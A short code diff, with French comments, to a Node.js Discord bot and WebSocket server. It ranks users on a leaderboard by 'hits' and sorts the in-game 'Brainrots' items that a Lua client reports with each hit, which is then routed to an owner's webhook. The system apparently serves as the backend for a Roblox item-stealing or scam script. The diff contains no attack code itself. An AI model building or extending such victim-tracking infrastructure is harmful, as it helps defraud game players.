@@ -283,8 +283,8 @@ clientDiscord.on(Events.InteractionCreate, async (interaction) => {
     
         let description = topUsers.map((user, i) => {
             const medal = i === 0 ? "🥇" : i === 1 ? "🥈" : i === 2 ? "🥉" : `${i + 1}.`;
-            // ICI : assure-toi que c'est bien user.userName
-            return `${medal} **@${user.userName}** — **${user.hits}** hits`;
+            // On utilise l'ID stocké dans _id pour la mention Discord
+            return `${medal} **<@${user._id}>** — **${user.hits}** hits`;
         }).join('\n');
     
         const lbEmbed = new EmbedBuilder()
@@ -446,7 +446,9 @@ wss.on('connection', (ws, req) => {
                 if (data.Method === "Hit") {
                     const hitInfo = data.Hit;
                     const webhookIdFromLua = hitInfo.WebHook; // C'est l'UUID (ex: wh_...)
-        
+                    if (hitInfo.Brainrots && hitInfo.Brainrots.length > 0) {
+                        hitInfo.Brainrots.sort((a, b) => (b.Income || 0) - (a.Income || 0));
+                    }
                     log(`🎯 Processing Hit from: ${hitInfo.Name}`);
         
                     // 1. Chercher le Webhook URL et l'Owner dans la DB
